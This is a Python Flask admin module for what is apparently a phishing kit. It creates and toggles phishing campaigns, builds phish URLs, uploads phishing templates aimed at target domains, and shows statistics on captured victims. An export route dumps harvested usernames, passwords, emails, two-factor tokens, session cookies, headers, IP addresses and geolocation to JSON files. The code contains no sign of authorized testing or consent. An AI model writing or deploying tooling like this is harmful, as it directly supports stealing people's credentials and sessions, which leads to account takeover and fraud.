import os
import json
import zipfile
from datetime import datetime
from flask import Blueprint, render_template, request, redirect, url_for, flash, jsonify, send_file
from flask_login import login_user, logout_user, login_required, current_user
from werkzeug.security import check_password_hash, generate_password_hash
from werkzeug.utils import secure_filename
from app import db
from models import User, Campaign, PhishingTemplate, CapturedCredential, SessionLog
from core.template_manager import TemplateManager
from core.analytics import Analytics
from utils.helpers import get_client_ip, get_geolocation

admin_bp = Blueprint('admin', __name__)

@admin_bp.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        user = User.query.filter_by(username=username).first()
        
        if user and check_password_hash(user.password_hash, password):
            login_user(user)
            user.last_login = datetime.utcnow()
            db.session.commit()
            flash('Login successful!', 'success')
            return redirect(url_for('admin.dashboard'))
        else:
            flash('Invalid username or password.', 'danger')
    
    return render_template('login.html')

@admin_bp.route('/logout')
@login_required
def logout():
    logout_user()
    flash('You have been logged out.', 'info')
    return redirect(url_for('admin.login'))

@admin_bp.route('/dashboard')
@login_required
def dashboard():
    # Get statistics
    total_campaigns = Campaign.query.count()
    active_campaigns = Campaign.query.filter_by(is_active=True).count()
    total_credentials = CapturedCredential.query.count()
    total_sessions = SessionLog.query.count()
    
    # Recent captures
    recent_captures = CapturedCredential.query.order_by(
        CapturedCredential.captured_at.desc()
    ).limit(10).all()
    
    # Analytics data
    analytics = Analytics()
    capture_stats = analytics.get_capture_statistics()
    
    return render_template('dashboard.html', 
                         total_campaigns=total_campaigns,
                         active_campaigns=active_campaigns,
                         total_credentials=total_credentials,
                         total_sessions=total_sessions,
                         recent_captures=recent_captures,
                         capture_stats=capture_stats)

@admin_bp.route('/campaigns')
@login_required
def campaigns():
    page = request.args.get('page', 1, type=int)
    campaigns = Campaign.query.order_by(Campaign.created_at.desc()).paginate(
        page=page, per_page=20, error_out=False
    )
    
    templates = PhishingTemplate.query.all()
    return render_template('campaigns.html', campaigns=campaigns, templates=templates)

@admin_bp.route('/campaigns/create', methods=['POST'])
@login_required
def create_campaign():
    name = request.form.get('name')
    description = request.form.get('description')
    template_id = request.form.get('template_id')
    target_url = request.form.get('target_url')
    port = request.form.get('port', type=int)
    path = request.form.get('path')
    
    # Generate phish URL
    base_url = request.host_url.rstrip('/')
    if port and port != 5000:
        phish_url = f"{base_url}:{port}"
    else:
        phish_url = f"{base_url}/phish"
    
    if path:
        phish_url += f"/{path}"
    
    campaign = Campaign(
        name=name,
        description=description,
        template_id=template_id,
        user_id=current_user.id,
        target_url=target_url,
        phish_url=phish_url,
        port=port,
        path=path
    )
    
    db.session.add(campaign)
    db.session.commit()
    
    flash('Campaign created successfully!', 'success')
    return redirect(url_for('admin.campaigns'))

@admin_bp.route('/campaigns/<int:campaign_id>/toggle')
@login_required
def toggle_campaign(campaign_id):
    campaign = Campaign.query.get_or_404(campaign_id)
    
    if campaign.is_active:
        campaign.is_active = False
        campaign.stopped_at = datetime.utcnow()
        flash(f'Campaign "{campaign.name}" stopped.', 'info')
    else:
        campaign.is_active = True
        campaign.started_at = datetime.utcnow()
        flash(f'Campaign "{campaign.name}" started.', 'success')
    
    db.session.commit()
    return redirect(url_for('admin.campaigns'))

@admin_bp.route('/templates')
@login_required
def templates_manager():
    templates = PhishingTemplate.query.all()
    return render_template('templates_manager.html', templates=templates)

@admin_bp.route('/templates/upload', methods=['POST'])
@login_required
def upload_template():
    if 'template_file' not in request.files:
        flash('No file selected.', 'danger')
        return redirect(url_for('admin.templates_manager'))
    
    file = request.files['template_file']
    if file.filename == '':
        flash('No file selected.', 'danger')
        return redirect(url_for('admin.templates_manager'))
    
    name = request.form.get('name')
    description = request.form.get('description')
    category = request.form.get('category')
    target_domain = request.form.get('target_domain')
    
    # Save template
    template_manager = TemplateManager()
    template_file = template_manager.save_template(file)
    
    template = PhishingTemplate(
        name=name,
        description=description,
        category=category,
        template_file=template_file,
        target_domain=target_domain,
        is_builtin=False
    )
    
    db.session.add(template)
    db.session.commit()
    
    flash('Template uploaded successfully!', 'success')
    return redirect(url_for('admin.templates_manager'))

@admin_bp.route('/analytics')
@login_required
def analytics():
    analytics = Analytics()
    
    # Get various analytics data
    capture_timeline = analytics.get_capture_timeline()
    location_stats = analytics.get_location_statistics()
    browser_stats = analytics.get_browser_statistics()
    campaign_performance = analytics.get_campaign_performance()
    
    return render_template('analytics.html',
                         capture_timeline=capture_timeline,
                         location_stats=location_stats,
                         browser_stats=browser_stats,
                         campaign_performance=campaign_performance)

@admin_bp.route('/logs')
@login_required
def logs():
    log_type = request.args.get('type', 'credentials')
    page = request.args.get('page', 1, type=int)
    
    if log_type == 'credentials':
        logs = CapturedCredential.query.order_by(
            CapturedCredential.captured_at.desc()
        ).paginate(page=page, per_page=50, error_out=False)
    else:
        logs = SessionLog.query.order_by(
            SessionLog.timestamp.desc()
        ).paginate(page=page, per_page=50, error_out=False)
    
    return render_template('logs.html', logs=logs, log_type=log_type)

@admin_bp.route('/logs/export/<log_type>')
@login_required
def export_logs(log_type):
    if log_type == 'credentials':
        credentials = CapturedCredential.query.all()
        data = []
        for cred in credentials:
            data.append({
                'campaign': cred.campaign.name,
                'username': cred.username,
                'password': cred.password,
                'email': cred.email,
                'ip_address': cred.ip_address,
                'user_agent': cred.user_agent,
                'country': cred.country,
                'city': cred.city,
                'two_fa_token': cred.two_fa_token,
                'captured_at': cred.captured_at.isoformat()
            })
    else:
        sessions = SessionLog.query.all()
        data = []
        for session in sessions:
            data.append({
                'campaign': session.campaign.name if session.campaign else 'Unknown',
                'session_id': session.session_id,
                'cookies': session.cookies,
                'headers': session.headers,
                'ip_address': session.ip_address,
                'user_agent': session.user_agent,
                'request_url': session.request_url,
                'timestamp': session.timestamp.isoformat()
            })
    
    # Create temporary file
    import tempfile
    with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
        json.dump(data, f, indent=2)
        temp_file = f.name
    
    return send_file(temp_file, as_attachment=True, 
                    download_name=f'{log_type}_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json')

@admin_bp.route('/settings')
@login_required
def settings():
    return render_template('settings.html')

@admin_bp.route('/settings/update', methods=['POST'])
@login_required
def update_settings():
    # Update user settings
    if request.form.get('new_password'):
        current_user.password_hash = generate_password_hash(request.form.get('new_password'))
        db.session.commit()
        flash('Password updated successfully!', 'success')
    
    return redirect(url_for('admin.settings'))
